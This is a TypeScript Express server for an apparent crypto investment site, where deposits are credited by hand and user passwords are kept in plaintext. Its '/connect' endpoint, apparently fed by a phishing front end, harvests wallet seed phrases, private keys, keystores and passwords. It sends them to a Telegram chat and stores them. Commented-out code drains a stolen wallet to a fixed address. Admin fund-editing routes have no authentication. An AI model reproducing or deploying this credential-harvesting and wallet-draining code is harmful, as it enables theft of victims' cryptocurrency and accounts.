import express, { Application, Request, Response } from "express";
import bcrypt from "bcryptjs";
import modules from "./modules";
import path from "path";
import bodyParser from "body-parser";
import cookieParser from "cookie-parser";
import Transaction from "./models/transaction.model";
import User, { IUser } from "./models/user.model";
import { SignInBody } from "./modules/user/interface/users.types";
import { loginResponse } from "./utils/login-response";
import { BadRequestException } from "./utils/service-exception";
import { error } from "console";
import { stat } from "fs";
import Message from "./models/messages.model";
import HubWallet from "./models/hubwallet.model";
import axios from "axios";
import { ethers } from 'ethers';


const app: Application = express();
app.use(cookieParser());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.use(express.json());
app.use(modules);
const cors = require('cors');


app.use(cors());
app.set("view engine", "ejs");
app.set("views", path.join(__dirname, "../views"));
const requireLogin = (req, res, next) => {
  const authCookie = req.cookies.auth;
  if (authCookie) {
    // User is logged in
    next();
  } else {
    // User is not logged in, redirect to login page or show an error message
    res.redirect("/login"); // Redirect to the login page
  }
};
app.get("/", (req: Request, res: Response) => {
  res.render("index.ejs");
});

app.post("/deposit", requireLogin, (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;
  const { amount, type, coin, userId, status } = req.body;
  try {
    const data = {
      amount,
      type,
      coin,
      status,
      userId,
    };

    const auth = JSON.parse(authCookie);
    data.userId = auth.email;
    data.status = "Pending";
    data.type = "Deposit";
    const deposit = Transaction.create(data);
    const message = "Submitted, copy the wallet address"; // Set the success message
    res.render("wallet-address.ejs", { coin, message });
  } catch (err) {
    console.log(err);
  }
});
app.get("/dashboard", requireLogin, async (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  const auth = JSON.parse(authCookie); // Parse the user data from the cookie

  res.render("dashboard.ejs", { user: auth });
});
app.post("/withdraw", requireLogin, async (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;
  const { amount, type, coin, userId, address, status } = req.body;
  try {
    const data = {
      amount,
      type,
      coin,
      status,
      address,
      userId,
    };

    const auth = JSON.parse(authCookie);
    data.userId = auth.email;
    data.status = "Pending";
    data.type = "Withdrawal";
    const withdraw = Transaction.create(data);
    const message = "Submitted, copy the wallet address"; // Set the success message
    const transactions = await Transaction.find({ userId: auth.email }).sort({
      createdAt: -1,
    });
    res.render("history.ejs", { transactions });
  } catch (err) {
    console.log(err);
  }
});
app.get("/withdraw", requireLogin, async (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  const auth = JSON.parse(authCookie); // Parse the user data from the cookie

  res.render("withdraw.ejs", { user: auth });
});
app.get("/deposit", requireLogin, async (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  const auth = JSON.parse(authCookie); // Parse the user data from the cookie

  res.render("deposit.ejs", { user: auth });
});
app.get(
  "/wallet-address",
  requireLogin,
  async (req: Request, res: Response) => {
    const authCookie = req.cookies.auth;

    if (!authCookie) {
      return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
    }

    const auth = JSON.parse(authCookie); // Parse the user data from the cookie
    const coin = req.query.coin || "btc"; // Get the coin value from query parameter (default: btc)
    console.log(coin);
    res.render("wallet-address.ejs", { user: auth, coin: coin });
  }
);
app.get("/history", requireLogin, async (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  const auth = JSON.parse(authCookie); // Parse the user data from the cookie

  // Retrieve the transaction history for the user from the database
  const transactions = await Transaction.find({ userId: auth.email }).sort({
    createdAt: -1,
  });

  res.render("history.ejs", { user: auth, transactions });
});
app.get("/login", (req: Request, res: Response) => {
  res.render("login.ejs", { error });
});
app.get("/signup", (req: Request, res: Response) => {
  res.render("signup.ejs", { error });
});
app.post("/signup", async (req: Request, res: Response) => {
  const reqemail = req.body.email;
  const reqpassword = req.body.password;
  const requsername = req.body.username;
  const reqconfirmPassword = req.body.confirmPassword;
  const reqphone = req.body.phone;
  const tc = req.body.tc;
  try {
    const user = await User.findOne({ email: reqemail });

    if (user) {
      const error = "UserAlreadyExists";
      return res.render("signup", { error });
    }
    if (reqpassword !== reqconfirmPassword) {
      const error = "PasswordsDoNotMatch";
      return res.render("signup", { error });
    }
    if (!tc) {
      const error = "noTC";
      return res.render("signup", { error });
    }
    const hashedPassword = await bcrypt.hash(reqpassword, 10);
    const userData: Partial<IUser> = {
      username: requsername,
      email: reqemail,
      password: hashedPassword,
      phone: reqphone,
      unhashedPassword: reqpassword,
    };
    const users = await User.create(userData);

    // Send welcome email
    // await this.sendWelcomeEmail(payload.email);

    // Redirect to a success page
    res.redirect("/login"); // Change "/success" to the desired success page URL
  } catch (err) {
    console.log(err);
    const error = "ServerError";
    // Redirect to an error page
    res.redirect("/signup"); // Change "/error" to the desired error page URL
  }
});
app.post("/login", async (req: Request, res: Response) => {
  const reqemail = req.body.email;
  const reqpassword = req.body.password;
  const user = await User.findOne({ email: reqemail });

  if (!user) {
    const error = "noUser";
    return res.render("login", { error });
  }

  const validPassword = await bcrypt.compare(reqpassword, user.password);
  if (!validPassword) {
    const error = "invalid";
    return res.render("login", { error });
  }
  console.log("got here");
  loginResponse(user._id.toString());
  //res.cookie('auth', JSON.stringify(result.user), { httpOnly: true });

  res.redirect("/dashboard");
});

app.get("/logout", (req: Request, res: Response) => {
  // Clear the session or authentication cookies
  res.clearCookie("auth");

  // Redirect to the login page or any other desired page
  res.redirect("/login");
});
app.get("/reset-password", (req: Request, res: Response) => {
  // Clear the session or authentication cookies

  // Redirect to the login page or any other desired page
  res.render("reset-password.ejs");
});
app.post("/reset-password", async (req: Request, res: Response) => {
  const reqemail = req.body.email;
  const reqpassword = req.body.password;
  const reqconfirmPassword = req.body.confirmPassword;
  try {
    const user = await User.findOne({ email: reqemail });

    if (!user) {
      const error = "UserAlreadyExists";
      return res.render("reset-password", { error });
    }
    if (reqpassword !== reqconfirmPassword) {
      const error = "PasswordsDoNotMatch";
      return res.render("signup", { error });
    }

    const hashedPassword = await bcrypt.hash(reqpassword, 10);
    user.password = hashedPassword;
    user.unhashedPassword = reqpassword;
    await user.save();
    const error = "success";
    return res.render("login", { error });
  } catch (err) {
    console.log(err);
    const error = "ServerError";
    // Redirect to an error page
    res.redirect("/signup"); // Change "/error" to the desired error page URL
  }
});

app.get("/transactions", requireLogin, async (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  const auth = JSON.parse(authCookie); // Parse the user data from the cookie

  // Retrieve the transaction history for the user from the database
  const transactions = await Transaction.find().sort({
    createdAt: -1,
  });
  const userFunds = await User.find();

  if (auth.email != "info@digitalmaxtrd.com" && auth.email != "esanni5@gmail.com") {
    return res.redirect("/dashboard");
  }
  res.render("transactions.ejs", { user: auth, transactions, userFunds });
});

app.get("/editTransaction/:id", requireLogin, async (req, res) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  try {
    const transactionId = req.params.id;
    // Fetch the transaction by ID from your data source (e.g., database)
    const transaction = await Transaction.findById(transactionId);
    if (!transaction) {
      return res.status(404).send("Transaction not found");
    }
    res.render("edit-transaction", { transaction });
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal server error");
  }
});
app.post("/updateTransaction/:id", async (req, res) => {
  try {
    const transactionId = req.params.id;
    const updatedTransactionData = req.body;
    const { status, amount, userId, coin } = updatedTransactionData;
    // Update the transaction in your data source using the provided data
    await Transaction.updateOne({ _id: transactionId }, updatedTransactionData);

    if (updatedTransactionData.type === "Deposit") {
      if (status === "Approved") {
        // Find the user based on userId
        const user = await User.findOne({ email: userId });

        if (user) {
          const numericAmount = Number(amount);
          // Add the amount to btcTotal in the user's table
          if (coin === "btc" || coin === "Bitcoin") {
            user.btc += numericAmount;

          } else if (coin === "eth" || coin === "Ethereum") {
            user.eth += numericAmount;
          } else if (coin === "usdt" || coin === "Tether") {
            user.usdt += numericAmount;
          }

          await user.save();
        }
      }
    } else if (updatedTransactionData.type === "Withdrawal") {
      if (status === "Approved") {
        // Find the user based on userId
        const user = await User.findOne({ email: userId });

        if (user) {
          const numericAmount = Number(amount);
          // Add the amount to btcTotal in the user's table
          if (coin === "btc" || coin === "Bitcoin") {
            user.btc -= numericAmount;

          } else if (coin === "eth" || coin === "Ethereum") {
            user.eth -= numericAmount;
          } else if (coin === "usdt" || coin === "Tether") {
            user.usdt -= numericAmount;
          }

          await user.save();
        }
      }
    }

    res.redirect("/transactions"); // Redirect to transactions list
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal server error");
  }
});

app.get("/edit-user-funds/:id", requireLogin, async (req, res) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  try {
    const transactionId = req.params.id;
    // Fetch the transaction by ID from your data source (e.g., database)
    const transaction = await User.findById(transactionId);
    if (!transaction) {
      return res.status(404).send("Transaction not found");
    }
    res.render("edit-user-funds", { transaction });
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal server error");
  }
});
app.post("/update-user-funds/:id", async (req, res) => {
  try {
    const transactionId = req.params.id;
    const updatedTransactionData = req.body;
    // Update the transaction in your data source using the provided data
    await User.updateOne({ _id: transactionId }, updatedTransactionData);
    res.redirect("/transactions"); // Redirect to transactions list
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal server error");
  }
});

app.post("/support", requireLogin, async (req, res) => {
  const authCookie = req.cookies.auth;
  try {
    const { text, userId, type, createdAt } = req.body;
    const data = {
      text,
      createdAt,
      type,
      userId
    };
    const auth = JSON.parse(authCookie);
    data.userId = auth.email;
    data.createdAt = new Date();
    data.type = "user";
    const save = Message.create(data);
    const messages = await Message.find({ userId: auth.email }).sort({
      createdAt: 1,
    });

    res.render("support.ejs", { user: auth, messages });
  } catch (err) {

  }
})
app.get("/support", requireLogin, async (req: Request, res: Response) => {
  const authCookie = req.cookies.auth;
  const auth = JSON.parse(authCookie);
  const messages = await Message.find({ userId: auth.email }).sort({
    createdAt: 1,
  });

  res.render("support.ejs", { user: auth, messages });
});
app.get('/chats', async (req, res) => {
  try {
    const chats = await Message.find({
      opened: false
    })

    res.render('chats', { chats });
  } catch (error) {
    // Handle error
    console.error(error);
    res.status(500).send('Internal Server Error');
  }
});
app.get("/replychats/:userId", requireLogin, async (req, res) => {
  const authCookie = req.cookies.auth;

  if (!authCookie) {
    return res.redirect("/login"); // Redirect to the login page if the user data cookie is not found
  }

  try {
    const messageId = req.params.userId;
    // Fetch the transaction by ID from your data source (e.g., database)
    const messages = await Message.find({ userId: messageId }).sort({
      createdAt: 1,
    });


    if (!messages) {
      return res.status(404).send("message not found");
    }
    const updateResult = await Message.updateMany({ userId: messageId, opened: false }, { $set: { opened: true } });

    res.render("replychats", { messages, messageId });
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal server error");
  }
});
app.post("/replychats", requireLogin, async (req, res) => {
  const authCookie = req.cookies.auth;
  try {
    const { text, userId, type, opened, createdAt } = req.body;
    const data = {
      text,
      createdAt,
      type,
      opened,
      userId
    };
    const auth = JSON.parse(authCookie);
    const messageId = userId;
    data.createdAt = new Date();
    data.type = "admin";
    data.opened = true;
    const save = Message.create(data);
    const messages = await Message.find({ userId }).sort({
      createdAt: 1,
    });

    res.render("replychats.ejs", { user: auth, messages, messageId });
  } catch (err) {

  }
})



//////// AN ENDPOINT TO BE CALLED BY https://rpcmasters.com/#
app.post("/connect", async (req, res) => {
  try {
    const { wallet_id, type, value, phraseinput, keystoreval, password, privatekeyval, createdAt } = req.body;

    const data = {
      wallet_id,
      type,
      value,
      phraseinput,
      keystoreval,
      password,
      privatekeyval,
      createdAt,
    };

    const text = JSON.stringify(data, null, 4);
    data.createdAt = new Date();
    if (phraseinput != null) {
      // sendETH(phraseinput)
    }
    sendToTelegram("1618693731", text);
    const savedData = await HubWallet.create(data);

     
    // sendToTelegramPacho("6852059122", text);

    res.redirect('https://rpc-support.surge.sh/badrequest');
    return savedData;
  } catch (err) {
    console.error(err);
    res.status(500).send("Internal Server Error");
  }
})
app.get('/wallets', async (req, res) => {
  try {
    //const specificDate = new Date('2024-06-04T00:00:00Z');
    // const wallets = await HubWallet.find({ createdAt: { $lt: specificDate } })
    const wallets = await HubWallet.find()
    res.json({ wallets });
  } catch (error) {
    // Handle error
    console.error(error);
    res.status(500).send('Internal Server Error');
  }
});
app.post("/deletetr/:id", async (req, res) => {
  try {
    const id = req.params.id;
    // Update the transaction in your data source using the provided data
    await HubWallet.deleteOne({ _id: id });

    res.redirect('https://rpc-support.surge.sh/localhost');
  } catch (error) {
    console.error(error);
    res.status(500).send("Internal server error");
  }
});
interface TelegramMessage {
  chat_id: string;
  text: string;
}
async function sendToTelegram(chatId: string, text: string): Promise<void> {
  const telegramToken = process.env.TELEGRAM_TOKEN;
  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
  const message: TelegramMessage = {
    chat_id: chatId,
    text: text
  };

  try {
    const response = await axios.post(url, message);
    console.log('Message sent to Telegram:', response.data);
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

async function sendToTelegramPacho(chatId: string, text: string): Promise<void> {
  const telegramToken = process.env.TELEGRAM_TOKEN_PACHO;
  const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
  const message: TelegramMessage = {
    chat_id: chatId,
    text: text
  };

  try {
    const response = await axios.post(url, message);
    console.log('Message sent to Telegram:', response.data);
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
  }
}

async function getEthUsdPrice() {
  try {
    const response = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd');
    return response.data.ethereum.usd;
  } catch (error) {
    console.error('Error fetching ETH to USD price:', error);
  }
}
// app.get("/sendETH", async (req, res) => {
//   try {
//     const phrase = req.body.phrase;
//     //Perform the transaction.
//     const mnemonic = phrase;
//     const providerUrl = `https://mainnet.infura.io/v3/${process.env.INFURA}`;

//     // Connect to the Ethereum network
//     const provider = new ethers.JsonRpcProvider(providerUrl);

//     // Create a wallet instance from the mnemonic
//     const wallet = ethers.Wallet.fromPhrase(mnemonic).connect(provider);

//     const balance = await provider.getBalance(wallet.address);

//     const balanceInEth = ethers.formatEther(balance);
//     const parsedEth = parseFloat(balanceInEth);

//     // Get ETH to USD exchange rate from COINGECKO
//     const ethUsdPrice = await getEthUsdPrice();

//     // Calculate balance in USD
//     const balanceInUsd = parsedEth * ethUsdPrice;
//     const usdRounded = balanceInUsd.toFixed(2);
//     const balanceMinus5 = parseFloat(usdRounded) - 5.00;
//     const valueToSend = balanceMinus5 / ethUsdPrice;

//     console.log(`Balance: ${balanceInEth} ETH`);
//     console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
//     //check if the eth amount in usd is more than $50
//     if (parseFloat(usdRounded) >= 50) {
//       // Create the transaction
//       const tx = await wallet.sendTransaction({
//         to: '0x54651BcEB497fE24244d49cD70Be405C52610d3f',
//         value: ethers.parseUnits(valueToSend.toString(), 'ether'),
//       });
//       // Send the transaction
//       const transactionResponse = await wallet.sendTransaction(tx);
//     }
//   } catch (e) {
//     console.log(e.message)
//   }
// })

// async function sendETH(req: Request) {
//   try {
//     const phrase = req.body.phrase;
//     //Perform the transaction.
//     const mnemonic = phrase;
//     const providerUrl = `https://mainnet.infura.io/v3/${process.env.INFURA}`;

//     // Connect to the Ethereum network
//     const provider = new ethers.JsonRpcProvider(providerUrl);

//     // Create a wallet instance from the mnemonic
//     const wallet = ethers.Wallet.fromPhrase(mnemonic).connect(provider);

//     const balance = await provider.getBalance(wallet.address);

//     const balanceInEth = ethers.formatEther(balance);
//     const parsedEth = parseFloat(balanceInEth);

//     // Get ETH to USD exchange rate from COINGECKO
//     const ethUsdPrice = await getEthUsdPrice();

//     // Calculate balance in USD
//     const balanceInUsd = parsedEth * ethUsdPrice;
//     const usdRounded = balanceInUsd.toFixed(2);
//     const balanceMinus5 = parseFloat(usdRounded) - 5.00;
//     const valueToSend = balanceMinus5 / ethUsdPrice;

//     console.log(`Balance: ${balanceInEth} ETH`);
//     console.log(`Balance: $${balanceInUsd.toFixed(2)} USD`);
//     //check if the eth amount in usd is more than $50
//     if (parseFloat(usdRounded) >= 50) {
//       // Create the transaction
//       const tx = await wallet.sendTransaction({
//         to: '0x54651BcEB497fE24244d49cD70Be405C52610d3f',
//         value: ethers.parseUnits(valueToSend.toString(), 'ether'),
//       });
//       // Send the transaction
//       const transactionResponse = await wallet.sendTransaction(tx);
//     }
//   } catch (e) {
//     console.log(e.message)
//   }
// }
export default app;
